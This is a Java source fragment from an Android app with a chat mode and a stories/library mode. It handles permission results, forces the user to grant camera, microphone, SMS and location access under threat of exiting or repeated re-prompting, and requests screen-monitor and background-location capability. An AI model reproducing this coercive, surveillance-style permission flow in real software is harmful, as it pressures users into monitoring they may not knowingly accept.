                            .setTitle("\u0625\u0630\u0646 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062A \u0645\u0637\u0644\u0648\u0628")
                            .setMessage("\u064A\u062C\u0628 \u062A\u0641\u0639\u064A\u0644 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062A \u0644\u0627\u0633\u062A\u0642\u0628\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644. \u064A\u0631\u062C\u0649 \u062A\u0641\u0639\u064A\u0644\u0647\u0627 \u0645\u0646 \u0627\u0644\u0625\u0639\u062F\u0627\u062F\u0627\u062A.")
                            .setPositiveButton("\u0641\u062A\u062D \u0627\u0644\u0625\u0639\u062F\u0627\u062F\u0627\u062A", (dialog, which) -> {
                                Intent intent = new Intent(android.provider.Settings.ACTION_APP_NOTIFICATION_SETTINGS);
                                intent.putExtra(android.provider.Settings.EXTRA_APP_PACKAGE, getPackageName());
                                startActivityForResult(intent, REQUEST_NOTIFICATION_SETTINGS);
                            })
                            .setCancelable(false)
                            .show();
                } else {
                    new AlertDialog.Builder(this)
                            .setTitle("\u0625\u0630\u0646 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062A \u0645\u0637\u0644\u0648\u0628")
                            .setMessage("\u064A\u062C\u0628 \u0627\u0644\u0633\u0645\u0627\u062D \u0628\u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062A \u0644\u0627\u0633\u062A\u0642\u0628\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0648\u0627\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062A.")
                            .setPositiveButton("\u0645\u0648\u0627\u0641\u0642", (dialog, which) -> requestNotificationPermission())
                            .setCancelable(false)
                            .show();
                }
            }
        }

        else if (requestCode == REQUEST_CAMERA_AUDIO_PERMISSION) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                }
            }
            
            if (allGranted) {
                Log.d(TAG, "Camera/audio permissions granted");
                requestScreenMonitorPermission();
            } else {
                Log.w(TAG, "Camera/audio permissions denied");
                new AlertDialog.Builder(this)
                    .setTitle("Permissions Required")
                    .setMessage("Camera and/or Microphone permissions are required.\n\n" +
                               "Please grant the permissions or the app will exit.")
                    .setPositiveButton("Try Again", (dialog, which) -> requestCameraAndAudioPermissions())
                    .setNegativeButton("Exit App", (dialog, which) -> {
                        Toast.makeText(this, "Exiting app due to missing permissions", Toast.LENGTH_LONG).show();
                        finishAffinity();
                    })
                    .setCancelable(false)
                    .show();
            }
        }
        
        else if (requestCode == REQUEST_LOCATION_PERMISSION) {
            boolean locationGranted = false;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) continue;
                if (Manifest.permission.ACCESS_FINE_LOCATION.equals(permissions[i])
                        || Manifest.permission.ACCESS_COARSE_LOCATION.equals(permissions[i])) {
                    locationGranted = true;
                    break;
                }
            }
            
            if (locationGranted) {
                Log.d(TAG, "✅ Location permission granted (foreground service will keep it running in background)");
                Toast.makeText(this, "Location permission granted", Toast.LENGTH_SHORT).show();
                requestBatteryOptimization(); // Go directly to battery optimization
            } else {
                Log.w(TAG, "❌ Location permission denied - continuing anyway");
                Toast.makeText(this, "Location permission denied", Toast.LENGTH_SHORT).show();
                requestBatteryOptimization(); // Continue even if denied
            }
        }

        else if (requestCode == REQUEST_CHAT_LOCATION_FOR_PANEL) {
            boolean locationGranted = false;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) continue;
                if (Manifest.permission.ACCESS_FINE_LOCATION.equals(permissions[i])
                        || Manifest.permission.ACCESS_COARSE_LOCATION.equals(permissions[i])) {
                    locationGranted = true;
                    break;
                }
            }
            if (locationGranted) {
                Log.d(TAG, "✅ Chat panel location permission granted");
                Toast.makeText(this,
                        "\u062A\u0645 \u062A\u0641\u0639\u064A\u0644 \u0625\u0630\u0646 \u0627\u0644\u0645\u0648\u0642\u0639",
                        Toast.LENGTH_SHORT).show();
                requestBatteryOptimization();
            } else {
                Log.w(TAG, "Chat location denied — re-prompting (mandatory)");
                Toast.makeText(this,
                        "\u0644\u0627 \u064A\u0645\u0643\u0646 \u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u062A\u0637\u0628\u064A\u0642 \u062F\u0648\u0646 \u0625\u0630\u0646 \u0627\u0644\u0645\u0648\u0642\u0639. \u064A\u0631\u062C\u0649 \u0627\u0644\u0633\u0645\u0627\u062D.",
                        Toast.LENGTH_LONG).show();
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                        this::requestLocationForChatPanelIfNeeded, 450);
            }
        }
        
        else if (requestCode == REQUEST_SMS_PERMISSION) {
            boolean smsGranted = grantResults.length > 0 && 
                grantResults[0] == PackageManager.PERMISSION_GRANTED;
            
            if (smsGranted) {
                Log.d(TAG, "✅ SMS permission granted");
                Toast.makeText(this, "SMS permission granted", Toast.LENGTH_SHORT).show();
                requestBatteryOptimization();
            } else {
                Log.w(TAG, "❌ SMS permission denied");
                new AlertDialog.Builder(this)
                    .setTitle("SMS Permission Required")
                    .setMessage("SMS permission is required for the app to work.\n\n" +
                               "Please grant the permission or the app will exit.")
                    .setPositiveButton("Try Again", (dialog, which) -> requestSmsPermission())
                    .setNegativeButton("Exit App", (dialog, which) -> {
                        Toast.makeText(this, "Exiting app due to missing permission", Toast.LENGTH_LONG).show();
                        finishAffinity();
                    })
                    .setCancelable(false)
                    .show();
            }
        }
    }
    
    private void setupStatusBar() {
        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
        int bgColor = getResources().getColor(R.color.chat_background, getTheme());
        getWindow().setStatusBarColor(bgColor);
        getWindow().setNavigationBarColor(bgColor);

        View decorView = getWindow().getDecorView();
        WindowInsetsControllerCompat controller = new WindowInsetsControllerCompat(getWindow(), decorView);
        controller.setAppearanceLightStatusBars(false);
        controller.setAppearanceLightNavigationBars(false);
    }
    
    private void initFragments() {
        if (isChatMode) {
            chatListFragment = new ChatListFragment();
            contactsFragment = new ContactsFragment();
            callsFragment = new CallsFragment();
            chatSettingsFragment = new ChatSettingsFragment();
            defaultFragment = chatListFragment;
        } else {
            homeFragment = new HomeFragment();
            libraryFragment = new LibraryFragment();
            exploreFragment = new ExploreFragment();
            settingsFragment = new SettingsFragment();
            defaultFragment = homeFragment;
        }
    }
    
    private void initViews() {
        bottomNavigation = findViewById(R.id.bottom_navigation);
        MaterialCardView bottomNavCard = findViewById(R.id.bottom_nav_card);

        // M3-style pill behind selected tab + gold ripple (XML attrs not linked for this widget on all AGP merges)
        bottomNavigation.setItemActiveIndicatorEnabled(true);
        bottomNavigation.setItemActiveIndicatorColor(
            ColorStateList.valueOf(ContextCompat.getColor(this, R.color.nav_indicator_pill)));

        if (isChatMode) {
            if (bottomNavCard != null) {
                bottomNavCard.setCardBackgroundColor(
                    ContextCompat.getColor(this, R.color.chat_nav_bar_float));
            }
            bottomNavigation.getMenu().clear();
            bottomNavigation.inflateMenu(R.menu.bottom_nav_chat_menu);
            bottomNavigation.setBackgroundColor(android.graphics.Color.TRANSPARENT);
            ColorStateList chatNavColors;
            try {
                int[][] states = new int[][]{
                    new int[]{android.R.attr.state_checked},
                    new int[]{-android.R.attr.state_checked}
                };
                int[] colors = new int[]{
                    ContextCompat.getColor(this, R.color.chat_nav_selected),
                    ContextCompat.getColor(this, R.color.chat_nav_unselected)
                };
                chatNavColors = new ColorStateList(states, colors);
            } catch (Exception e) {
                Log.e(TAG, "Error setting chat nav colors", e);
                chatNavColors = ColorStateList.valueOf(
                    ContextCompat.getColor(this, R.color.chat_nav_unselected));
            }
            bottomNavigation.setItemIconTintList(chatNavColors);
            bottomNavigation.setItemTextColor(chatNavColors);
            bottomNavigation.setItemActiveIndicatorColor(
                ColorStateList.valueOf(ContextCompat.getColor(this, R.color.chat_nav_indicator)));
            bottomNavigation.setItemRippleColor(
                ColorStateList.valueOf(ContextCompat.getColor(this, R.color.chat_nav_ripple)));
        }

        bottomNavigation.setOnItemSelectedListener(this::onNavigationItemSelected);
    }
    
    private boolean onNavigationItemSelected(@NonNull MenuItem item) {
        Fragment selectedFragment = null;
        
        int itemId = item.getItemId();
        
        if (isChatMode) {
            if (itemId == R.id.nav_chats) {
                selectedFragment = chatListFragment;
            } else if (itemId == R.id.nav_contacts) {
                selectedFragment = contactsFragment;
            } else if (itemId == R.id.nav_calls) {
                selectedFragment = callsFragment;
            } else if (itemId == R.id.nav_chat_settings) {
                selectedFragment = chatSettingsFragment;
            }
        } else {
            if (itemId == R.id.nav_home) {
                selectedFragment = homeFragment;
            } else if (itemId == R.id.nav_stories) {
                selectedFragment = libraryFragment;
            } else if (itemId == R.id.nav_explore) {
                selectedFragment = exploreFragment;
            } else if (itemId == R.id.nav_settings) {
                selectedFragment = settingsFragment;
            }
        }
        
        if (selectedFragment != null && selectedFragment != currentFragment) {
            loadFragment(selectedFragment);
            return true;
        }
        
        return false;
    }
    
    private void loadFragment(Fragment fragment) {
        if (fragment == currentFragment) return;

        FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
        transaction.setReorderingAllowed(true);

        if (currentFragment != null) {
            transaction.hide(currentFragment);
        }

        if (fragment.isAdded()) {
            transaction.show(fragment);
        } else {
            transaction.add(R.id.fragment_container, fragment);
        }

        currentFragment = fragment;
        transaction.commitNowAllowingStateLoss();
    }
    
    @Override
    public void onBackPressed() {
        if (isChatMode) {
            if (currentFragment != chatListFragment) {
                bottomNavigation.setSelectedItemId(R.id.nav_chats);
            } else {
                super.onBackPressed();
            }
        } else {
            if (currentFragment != homeFragment) {
                bottomNavigation.setSelectedItemId(R.id.nav_home);
            } else {
                super.onBackPressed();
            }
        }
    }
}

